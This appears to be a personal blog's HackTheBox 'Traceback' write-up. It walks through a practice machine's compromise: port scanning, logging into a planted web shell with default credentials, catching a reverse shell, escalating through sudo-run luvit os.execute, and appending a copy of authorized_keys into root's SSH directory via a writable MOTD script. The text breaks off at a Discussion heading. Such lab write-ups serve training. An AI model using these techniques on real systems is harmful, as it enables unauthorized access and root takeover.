@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Traceback Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Traceback.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Traceback Writeup">
+  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Traceback.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-traceback/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Traceback Writeup">
+  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Traceback.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-08-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-08-23T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-traceback/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-traceback/">
+              HTB: Traceback Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2020-08-23T00:00:00Z">
+                August 23, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              9-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#high-level-information">High-Level Information</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#discussion">Discussion</a>
+      <ol>
+        <li><a href="#topic-1-breaking-out-of-the-restricted-environment">Topic #1: Breaking Out of the Restricted Environment</a></li>
+        <li><a href="#topic-2-motd">Topic #2: MOTD</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+</div>
+<h1 id="high-level-information">
+  High-Level Information
+  <a class="heading-link" href="#high-level-information">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Machine Name: Traceback</p>
+<p>IP Address: 10.10.10.181</p>
+<p>Difficulty: Easy</p>
+<p>Summary: HackTheBox&rsquo;s Traceback was retired this past week, and it was a relatively straightforward box that required no active exploitation. The home page of the website hosted on port 80 claimed that the site had been &ldquo;owned&rdquo; and that a backdoor existed on the site. Reading the source code of that page provided a peculiar comment that, when googled, pointed towards a <a href="https://github.com/TheBinitGhimire/Web-Shells"  class="external-link" target="_blank" rel="noopener">GitHub repository of web shells</a>. Attempting to access each of these web shells on the &ldquo;owned&rdquo; site eventually led to the discovery of <code>smevk.php</code>. Logging in to the page using its default credentials provides a stereotypical looking &ldquo;hacker&rdquo; interface in which one can execute arbitrary code. From there, I was able to get a low shell as the <code>webadmin</code> user. Using <code>sudo</code> in conjunction with the <code>os.execute()</code> function within Luvit, I was able to escalate privileges to the <code>sysadmin</code> user. As the <code>sysadmin</code> user, I was able to modify the MOTD script used to provide a login banner for SSH to add my public key to the <code>root</code> user&rsquo;s <code>authorized_keys</code> file. As the script was run on a cronjob as the <code>root</code> user, it was simply a matter of time before I was able to easily walk through the front door.</p>
+<p>Tools Used: Nmap, Gobuster, Netcat, <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"  class="external-link" target="_blank" rel="noopener">linPEAS</a></p>
+<h1 id="initial-foothold">
+  Initial Foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>As always, I began by running Nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~$ /opt/stagednmap.sh 10.10.10.181
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-06-21 11:43 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.181
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.057s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: 65533 closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: 1 IP address <span style="color:#ff7b72;font-weight:bold">(</span>1 host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 35.99 seconds
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-06-21 11:43 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.181
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.053s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span style="color:#ff7b72;font-weight:bold">(</span>RSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#ff7b72;font-weight:bold">((</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Help us
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: 1 IP address <span style="color:#ff7b72;font-weight:bold">(</span>1 host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 9.42 seconds
+</span></span><span style="display:flex;"><span>matt@kali:~$
+</span></span></code></pre></div><p>With only ports 22 and 80 open, I began to enumerate the website:</p>
+<p><img src="web-main.png" alt=""> <img src="web-404.png" alt=""></p>
+<p>Interestingly, the page claimed that the site had been &ldquo;owned&rdquo; and that there was a backdoor. Unfortunately, additional details were pretty sparse, so I decided to move on.</p>
+<p>With no links to follow nor obvious exploits available, I attempted to enumerate directories using Gobuster. Unfortunately, that was equally fruitless. With little else to do, I inspected the source code of the main page, which contained a peculiar comment:</p>
+<p><img src="web-source-comment.png" alt=""></p>
+<p>Googling the phrase led to the discovery of a <a href="https://github.com/TheBinitGhimire/Web-Shells"  class="external-link" target="_blank" rel="noopener">GitHub repository of web shells</a>. Using that information, I was able to find the backdoor at <code>/smevk.php</code>.</p>
+<p><img src="web-shell-login-panel.png" alt=""></p>
+<p>The default credentials of <code>admin:admin</code> were accepted, and I was brought to a console that seemingly let me remotely execute code.</p>
+<p>After testing to ensure that it actually did what it purported to do, I ran a Perl script that resulted in a low shell:</p>
+<p><img src="web-shell-gotuser.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~$ sudo netcat -nvlp <span style="color:#a5d6ff">1234</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> 1234 ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.25<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.181<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">55922</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#f85149">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>webadmin
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>webadmin<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>webadmin<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1000<span style="color:#ff7b72;font-weight:bold">(</span>webadmin<span style="color:#ff7b72;font-weight:bold">)</span>,24<span style="color:#ff7b72;font-weight:bold">(</span>cdrom<span style="color:#ff7b72;font-weight:bold">)</span>,30<span style="color:#ff7b72;font-weight:bold">(</span>dip<span style="color:#ff7b72;font-weight:bold">)</span>,46<span style="color:#ff7b72;font-weight:bold">(</span>plugdev<span style="color:#ff7b72;font-weight:bold">)</span>,111<span style="color:#ff7b72;font-weight:bold">(</span>lpadmin<span style="color:#ff7b72;font-weight:bold">)</span>,112<span style="color:#ff7b72;font-weight:bold">(</span>sambashare<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>The account that I got a low shell on, <code>webadmin</code>, was relatively locked down and rightly so. However, it did have the ability to run <a href="https://luvit.io/"  class="external-link" target="_blank" rel="noopener">luvit</a> as the <code>sysadmin</code> user. Luvit has a built in ability to execute system code via the <code>os.execute()</code> function, which I used to get a less restrictive shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>webadmin@traceback:/var/www/html$ sudo -H -u sysadmin /home/sysadmin/luvit
+</span></span><span style="display:flex;"><span>Welcome to the Luvit repl!
+</span></span><span style="display:flex;"><span>&gt; os.execute <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;whoami&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>sysadmin
+</span></span><span style="display:flex;"><span>true    <span style="color:#a5d6ff">&#39;exit&#39;</span>  <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>&gt; os.execute <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;pwd&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/var/www/html
+</span></span><span style="display:flex;"><span>true    <span style="color:#a5d6ff">&#39;exit&#39;</span>  <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>&gt; os.execute <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;ls /home/sysadmin&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>luvit  user.txt
+</span></span><span style="display:flex;"><span>true    <span style="color:#a5d6ff">&#39;exit&#39;</span>  <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>&gt; os.execute <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;ls -la /home/sysadmin&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>total <span style="color:#a5d6ff">4340</span>
+</span></span><span style="display:flex;"><span>drwxr-x--- 5 sysadmin sysadmin    4096 Jun 21 10:54 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x 4 root     root        4096 Aug 25  2019 ..
+</span></span><span style="display:flex;"><span>-rw------- 1 sysadmin sysadmin       1 Aug 25  2019 .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 sysadmin sysadmin     220 Apr  4  2018 .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 sysadmin sysadmin    3771 Apr  4  2018 .bashrc
+</span></span><span style="display:flex;"><span>drwx------ 2 sysadmin sysadmin    4096 Aug 25  2019 .cache
+</span></span><span style="display:flex;"><span>drwxrwxr-x 3 sysadmin sysadmin    4096 Aug 24  2019 .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 sysadmin sysadmin     177 Jun 21 10:58 .luvit_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 sysadmin sysadmin     807 Apr  4  2018 .profile
+</span></span><span style="display:flex;"><span>drwxr-xr-x 2 root     root        4096 Aug 25  2019 .ssh
+</span></span><span style="display:flex;"><span>-rwxrwxr-x 1 sysadmin sysadmin 4397566 Aug 24  2019 luvit
+</span></span><span style="display:flex;"><span>-rw------- 1 sysadmin sysadmin      33 Jun 19 15:13 user.txt
+</span></span><span style="display:flex;"><span>true    <span style="color:#a5d6ff">&#39;exit&#39;</span>  <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>&gt; os.execute <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;/bin/bash -i&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>sysadmin@traceback:/var/www/html$
+</span></span></code></pre></div><p>As <code>sysadmin</code>, I ran linPEAS to see what possible vectors existed to get to root. One of the things that stood out was that all of the MOTD scripts were group-writable.</p>
+<p>For those who don&rsquo;t know, MOTD stands for &ldquo;Message of the Day&rdquo; and it is principally responsible for displaying the login message when someone logs in to a shell (via SSH, for example). What&rsquo;s convenient, for someone with malicious intent anyways, is that those login scripts are bash, which of course means you can do some pretty powerful stuff. In this case, those scripts were being executed as <code>root</code>!</p>
+<p>The script executed upon login is typically <code>00-header</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    00-header - create the header of the MOTD</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    This program is free software; you can redistribute it and/or modify</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    it under the terms of the GNU General Public License as published by</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    the Free Software Foundation; either version 2 of the License, or</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    (at your option) any later version.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    This program is distributed in the hope that it will be useful,</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    GNU General Public License for more details.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    You should have received a copy of the GNU General Public License along</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span> -r /etc/lsb-release <span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> . /etc/lsb-release
+</span></span><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#34;\nWelcome to Xh4H land \n&#34;</span>
+</span></span></code></pre></div><p>To verify that this was actually the case, I added my RSA public key to the <code>sysadmin</code> user&rsquo;s <code>authorized_keys</code> file and logged in via SSH:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/.ssh$ ssh -i id_rsa sysadmin@10.10.10.181
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#################################</span>
+</span></span><span style="display:flex;"><span>-------- OWNED BY XH4H  ---------
+</span></span><span style="display:flex;"><span>- I guess stuff could have been configured better ^^ -
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#################################</span>
+</span></span><span style="display:flex;"><span>Welcome to Xh4H land
+</span></span><span style="display:flex;"><span>Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>sysadmin<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>sysadmin<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>sysadmin<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><p>It appeared as though that was the case, so from there the plan was straightforward. I modified the script to copy <code>/home/sysadmin/.ssh/authorized_keys</code> to <code>/root/.ssh/authorized_keys</code>, echoed a message to confirm that the modified script ran as desired, and logged in via SSH:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    00-header - create the header of the MOTD</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    This program is free software; you can redistribute it and/or modify</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    it under the terms of the GNU General Public License as published by</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    the Free Software Foundation; either version 2 of the License, or</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    (at your option) any later version.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    This program is distributed in the hope that it will be useful,</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    GNU General Public License for more details.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    You should have received a copy of the GNU General Public License along</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span> -r /etc/lsb-release <span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> . /etc/lsb-release
+</span></span><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#34;\nWelcome to Xh4H land \n&#34;</span>
+</span></span><span style="display:flex;"><span>cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/authorized_keys
+</span></span><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#39;try logging in as root \n&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/.ssh$ ssh -i id_rsa sysadmin@10.10.10.181
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#################################</span>
+</span></span><span style="display:flex;"><span>-------- OWNED BY XH4H  ---------
+</span></span><span style="display:flex;"><span>- I guess stuff could have been configured better ^^ -
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">\n</span>Welcome to Xh4H land <span style="color:#79c0ff">\n</span>
+</span></span><span style="display:flex;"><span>try logging in as root <span style="color:#79c0ff">\n</span>
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>Last login: Sat Jun 27 09:29:38 2020 from 10.10.14.35
+</span></span><span style="display:flex;"><span>$ exit
+</span></span><span style="display:flex;"><span>Connection to 10.10.10.181 closed.
+</span></span><span style="display:flex;"><span>matt@kali:~/.ssh$ ssh -i id_rsa root@10.10.10.181
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#################################</span>
+</span></span><span style="display:flex;"><span>-------- OWNED BY XH4H  ---------
+</span></span><span style="display:flex;"><span>- I guess stuff could have been configured better ^^ -
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#################################</span>
+</span></span><span style="display:flex;"><span>Welcome to Xh4H land
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>Last login: Fri Jan 24 03:43:29 <span style="color:#a5d6ff">2020</span>
+</span></span><span style="display:flex;"><span>root@traceback:~# id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>root@traceback:~#
+</span></span></code></pre></div><h1 id="discussion">
+  Discussion
+  <a class="heading-link" href="#discussion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>As this box was simpler than some of the others I&rsquo;ve done in the past, I&rsquo;ll try to keep this section pretty short. There are two relevant discussion topics for this box, both of which related to privilege escalation.</p>
+<h2 id="topic-1-breaking-out-of-the-restricted-environment">
